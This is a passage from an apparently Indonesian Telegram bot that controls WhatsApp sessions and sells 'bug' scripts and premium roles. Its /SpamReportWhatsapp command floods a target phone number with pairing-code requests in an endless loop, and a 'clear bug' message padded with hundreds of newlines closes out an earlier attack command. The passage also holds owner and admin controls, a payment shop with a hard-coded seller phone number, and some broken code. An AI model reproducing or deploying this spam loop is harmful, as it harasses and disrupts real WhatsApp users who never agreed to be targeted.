                text: "Developer 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nXylent"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `<tg-emoji emoji-id="5350496629008917458">⛔</tg-emoji> <b>Akses Ditolak</b>\nAnda tidak memiliki izin untuk menggunakan command ini.`,
      { parse_mode: "HTML" } // Ganti ke HTML agar tg-emoji jalan
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
    // Tambahkan pesan sukses di sini jika perlu
  } catch (error) {
    // Pastikan variabel botNum atau botNumber konsisten (di kode kamu tadi botNum belum didefinisikan)
    console.error(`bot ${botNumber}:`, error); 
    bot.sendMessage(
      chatId,
      `<tg-emoji emoji-id="6098421155897545579">📢</tg-emoji> <b>Terjadi kesalahan</b> saat menghubungkan ke WhatsApp. Silakan coba lagi.`,
      { parse_mode: "HTML" } // Tambahkan ini juga
    );
  }
});


const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

const pendingPremium = {};

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

const { loadData, saveData } = require('./product.js');

// --- KONFIGURASI ---
const OWNER_ID = "8768626313";
const nope = "087729777800"; 
const FOTO_SC = "https://g.top4top.io/p_3788ghdlv1.jpg"; 
const FOTO_ROLE = "https://k.top4top.io/p_3764b0zhz1.jpg"; 
const QRIS = "https://j.top4top.io/p_3786uonou1.jpg";

let products = loadData();
const pendingOrders = new Map();
const waitingForFile = new Map();
const userAction = new Map();
const waitingProof = new Map();
const userWaitingPayment = new Map(); // Tracker untuk kirim bukti tanpa reply


// --- 1. MANAJEMEN PRODUK & ROLE (OWNER ONLY) ---
bot.onText(/\/(addproduct|addrole|delproduct)/, (msg, match) => {
    if (msg.from.id.toString() !== OWNER_ID) return;
    const command = match[1];

    if (command === "addproduct") {
        bot.sendMessage(msg.chat.id, "🛒 <b>ADD SCRIPT</b>\nFormat: <code>id|nama|harga|stok</code>", { parse_mode: "HTML" });
        userAction.set(msg.from.id, "adding_script");
    } else if (command === "addrole") {
        bot.sendMessage(msg.chat.id, "💎 <b>ADD ROLE</b>\nFormat: <code>id|nama|harga|stok</code>", { parse_mode: "HTML" });
        userAction.set(msg.from.id, "adding_role");
    } else {
        const list = Object.keys(products).map(id => `• <code>${id}</code> (${products[id].type})`).join("\n");
        bot.sendMessage(msg.chat.id, "🗑️ <b>DELETE PRODUCT</b>\nKirim ID yang ingin dihapus:\n\n" + (list || "Kosong"), { parse_mode: "HTML" });
        userAction.set(msg.from.id, "deleting");
    }
});

// Listener Input Teks Owner
bot.on('message', (msg) => {
    if (!userAction.has(msg.from.id) || !msg.text || msg.text.startsWith('/')) return;
    const action = userAction.get(msg.from.id);
    const input = msg.text.split("|").map(p => p.trim());

    if (action === "adding_script" || action === "adding_role") {
        if (input.length < 4) return bot.sendMessage(msg.chat.id, "❌ Format salah! Gunakan <code>id|nama|harga|stok</code>", { parse_mode: "HTML" });
        const [id, name, price, stock] = input;
        products[id] = { name, price, stock: parseInt(stock) || 0, type: action === "adding_script" ? "script" : "role" };
        saveData(products);
        bot.sendMessage(msg.chat.id, `✅ Berhasil menambah ${name} ke database!`);
    } else if (action === "deleting") {
        if (products[msg.text]) { 
            delete products[msg.text]; 
            saveData(products); 
            bot.sendMessage(msg.chat.id, "✅ Produk dihapus!"); 
        } else {
            bot.sendMessage(msg.chat.id, "❌ ID tidak ditemukan.");
        }
    }
    userAction.delete(msg.from.id);
});

// --- 2. MENU BUY SCRIPT & UP ROLE ---
bot.onText(/\/(buysc|uprole)/, async (msg) => {
    const isSc = msg.text.includes("buysc");
    const targetType = isSc ? "script" : "role";
    const filteredIds = Object.keys(products).filter(id => products[id].type === targetType);

    if (filteredIds.length === 0) return bot.sendMessage(msg.chat.id, "📭 Produk belum tersedia.");

    const keyboard = filteredIds.map(id => {
        const p = products[id];
        return [{ text: `${p.name} - Rp${p.price} [${p.stock > 0 ? 'READY' : 'SOLD'}]`, callback_data: `select_${id}` }];
    });
    
    if (!isSc) {
    return bot.sendMessage(
        msg.chat.id,
        `💎 Upgrade Role hanya bisa dilakukan via Owner.\n\n📞 Silahkan chat Owner sekarang.`,
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "📞 CHAT OWNER",
                            url: "https://t.me/Pinnxzy"
                        }
                    ]
                ]
            }
        }
    );
}

    bot.sendPhoto(msg.chat.id, isSc ? FOTO_SC : FOTO_ROLE, {
        caption: `<blockquote><b>⌜ ${isSc ? '🛒' : '💎'} ⌟ ${isSc ? 'STORE' : 'UPGRADE'}</b></blockquote>\nSilahkan pilih:`,
        parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard }
    });
});

// --- 3. CALLBACK PEMBAYARAN & ACC ---
bot.on('callback_query', async (query) => {
    try {

        const data = query.data;
        const chatId = query.message.chat.id;

        await bot.answerCallbackQuery(query.id);

        // ================= PILIH PRODUK =================
        if (data.startsWith("select_")) {

            const id = data.split("_")[1];
            const p = products[id];

            if (!p || p.stock <= 0) {
                return bot.sendMessage(chatId, "❌ Stok habis!");
            }

            return await bot.sendMessage(
                chatId,
                `<b>Produk:</b> ${p.name}
<b>Harga:</b> Rp${p.price}

Pilih metode pembayaran:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "💳 DANA",
                                    callback_data: `method_dana_${id}`
                                }
                            ],
                            [
                                {
                                    text: "📸 QRIS",
                                    callback_data: `method_qris_${id}`
                                }
                            ]
                        ]
                    }
                }
            );
        }

// ================= METODE PEMBAYARAN =================
// ================= METODE PEMBAYARAN =================
if (data.startsWith("method_")) {

    const [, method, id] = data.split("_");

    if (!products[id]) {
        return bot.sendMessage(chatId, "❌ Produk tidak ditemukan.");
    }

    waitingProof.set(chatId, id);

    const caption = `✨ <b>DETAIL PESANAN</b> ✨
──────────────────
📦 <b>Produk:</b> <code>${products[id].name}</code>

──────────────────
📢 <b>INSTRUKSI PEMBAYARAN:</b>
Silakan kirimkan <b>FOTO</b> bukti transfer Anda sekarang.

⚠️ <b>PERINGATAN:</b>
• Hanya menerima format <b>FOTO (JPG/PNG)</b>.
• File, Video, atau Teks ❌ <b>TIDAK AKAN DIPROSES</b>.`;

    // ====== DANA ======
    if (method === "dana") {
        return bot.sendMessage(
            chatId,
            `💳 <b>Pembayaran via DANA<tg-emoji emoji-id="6156901817146934803"></tg-emoji></b>\n\nNomor: <code>${nope}</code>\n\n${caption}`,
            { parse_mode: "HTML" }
        );
    }

    // ====== QRIS (KIRIM FOTO) ======
    if (method === "qris") {
        return bot.sendPhoto(
            chatId,
            QRIS, // link foto atau path file
            {
                caption: `📸 <b>Scan QRIS<tg-emoji emoji-id="6156788335521040752"></tg-emoji></b>\n\n${caption}`,
                parse_mode: "HTML"
            }
        );
    }
}

        // ================= ACC ORDER =================
        if (data.startsWith("acc_")) {

            const orderId = data.split("_")[1];
            const randomImage = getRandomImage();

            
            await bot.sendPhoto(
                OWNER_ID, randomImage,
                {
            caption: `✅ <b>PESANAN BERHASIL DITERIMA!</b>
─────────────────────
🆔 <b>Order ID:</b> <code>#${orderId}</code>

📥 <b>INSTRUKSI PENGIRIMAN:</b>
Silakan kirimkan <b>FILE</b> pesanan sekarang. 

Sistem akan otomatis meneruskan file tersebut kepada pembeli. Pastikan file sudah benar dan tidak korup.
─────────────────────
<i>Status: Menunggu unggahan file...</i>`,
            parse_mode: "HTML"
        }
    );   

    waitingForFile.set(OWNER_ID, orderId);
    return await bot.deleteMessage(chatId, query.message.message_id);
} 

// ================= tolak ORDER =================
if (data.startsWith("tolak_")) {
            const orderId = data.split("_")[1];
    const randomImage = getRandomImage();
    await bot.sendPhoto(
                OWNER_ID, randomImage,
               {
            caption: `🚫 <b>PESANAN DITOLAK</b> 🚫
─────────────────────
🆔 <b>ID Order:</b> <code>#${orderId}</code>
⚠️ <b>Status:</b> Pesanan Tidak Disetujui

<b>Mohon Maaf,</b>
Pesanan Anda telah ditolak oleh Owner/Admin. Silakan hubungi admin jika Anda merasa ini adalah kesalahan atau ingin menanyakan alasan pembatalan.
─────────────────────
<i>Dana akan dikembalikan sesuai kebijakan yang berlaku.</i>`,
            parse_mode: "HTML"
        }
    );
    
    return await bot.deleteMessage(chatId, query.message.message_id);
} 
  } catch (err) {
        console.log(err);
    } // tutup catch
});


// ================= TERIMA BUKTI TRANSFER =================

// FOTO (HP user biasanya)
bot.on('photo', async (msg) => {

    const chatId = msg.chat.id;

    const prodId = waitingProof.get(chatId);

    if (!prodId || !products[prodId]) {
        return;
    }

        if (prodId && products[prodId]) {
        const orderId = `XYLNT${Date.now().toString().slice(-4)}`;
        const p = products[prodId]; 
        
        pendingOrders.set(orderId, { userId: chatId, userName: msg.from.first_name, prodName: p.name, prodId });

        bot.sendMessage(chatId, `⏳ <b>PEMBAYARAN SEDANG DIVALIDASI</b>
─────────────────────
Bukti transfer Anda telah kami terima dan sedang dalam antrean pengecekan oleh <b>Owner/Admin</b>.

📝 <b>Mohon diperhatikan:</b>
• Jangan mengirim bukti yang sama berkali-kali.
• Proses ini biasanya memakan waktu 1-5 menit.
• Anda akan menerima notifikasi otomatis jika pesanan disetujui.

<i>Terima kasih telah menunggu...</i>`);
        
        bot.sendPhoto(OWNER_ID, msg.photo[msg.photo.length - 1].file_id, {
            caption: `📩 <b>NOTIFIKASI PESANAN BARU</b>
─────────────────────
🆔 <b>Order ID:</b> <code>#${orderId}</code>
📦 <b>Produk:</b> <code>${p.name}</code>
💰 <b>Harga:</b> <code>Rp${p.price.toLocaleString('id-ID')}</code>

👤 <b>Detail Pembeli:</b>
• Nama: <b>${msg.from.first_name}</b>
• ID: <code>${msg.from.id}</code>
─────────────────────
<i>Silakan cek bukti transfer yang dikirim setelah ini.</i>`,
            parse_mode: "HTML",
            reply_markup: { 
                inline_keyboard: [
                    [
                        { 
                            text: "✔️ TERIMA & KIRIM FILE", 
                            callback_data: `acc_${orderId}`,
                            style: "success" 
                        },
                        { 
                            text: "✖️ TOLAK", 
                            callback_data: `tolak_${orderId}`, 
                            style: "danger" 
                        }
                    ]
                ] 
            }
        });
        waitingProof.delete(chatId);
    }
});



// DOCUMENT (Desktop user biasanya kirim gambar sebagai file)
bot.on('document', async (msg) => {
    if (msg.from.id.toString() === OWNER_ID && waitingForFile.has(OWNER_ID)) {
        const orderId = waitingForFile.get(OWNER_ID);
        const order = pendingOrders.get(orderId);

        try {
            // --- 1. PESAN UNTUK BUYER (TAMPILAN BARU) ---
            await bot.sendDocument(order.userId, msg.document.file_id, { 
                caption: 
                    `✨ <b>TERIMA KASIH TELAH ORDER!</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📦 <b>Produk:</b> <code>${order.prodName}</code>\n` +
                    `🆔 <b>Order ID:</b> <code>#${orderId}</code>\n` +
                    `📅 <b>Status:</b> <code>SELESAI / COMPLETED</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `🚀 <i>File pesanan Anda ada di atas. Silakan simpan dengan baik. Jika ada kendala, hubungi Owner!</i>\n\n` +
                    `<b>XYLENT MARKET</b>`, 
                parse_mode: "HTML" 
            });

            // Update Stok
            if (products[order.prodId]) { 
                products[order.prodId].stock -= 1; 
                saveData(products); 
            }

            // --- 2. NOTIFIKASI UNTUK OWNER ---
            await bot.sendMessage(OWNER_ID, 
                `✅ <b>MISSION SUCCESS!</b>\n\n` +
                `File pesanan <b>[${orderId}]</b> telah berhasil diteruskan ke pembeli secara otomatis.\n\n` +
                `<b>Status:</b> Terkirim & Aman\n` +
                `<b>Saldo:</b> Cuan Masuk! 💸\n\n` +
                `<i>Sistem kembali standby untuk orderan berikutnya.</i>`, 
                { parse_mode: "HTML" }
            );

            // Bersihkan Cache
            waitingForFile.delete(OWNER_ID);
            pendingOrders.delete(orderId);

        } catch (e) { 
            console.log("Error Send File:", e);
            bot.sendMessage(
    OWNER_ID, 
    `🚨 <b>CRITICAL ERROR: DELIVERY FAILED</b>
─────────────────────
📦 <b>Order ID:</b> <code>#${orderId}</code>
❌ <b>Masalah:</b> File Gagal Diteruskan

<b>Kemungkinan Penyebab:</b>
• User telah memblokir Bot.
• User menghapus akun/chat.
• Gangguan API Telegram atau Jaringan.

⚠️ <b>Tindakan:</b> Segera hubungi pembeli secara manual untuk memastikan pesanan tetap sampai.
─────────────────────
<code>Log Status: delivery_attempt_failed</code>`, 
    { parse_mode: "HTML" }); 
        }
    }
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});


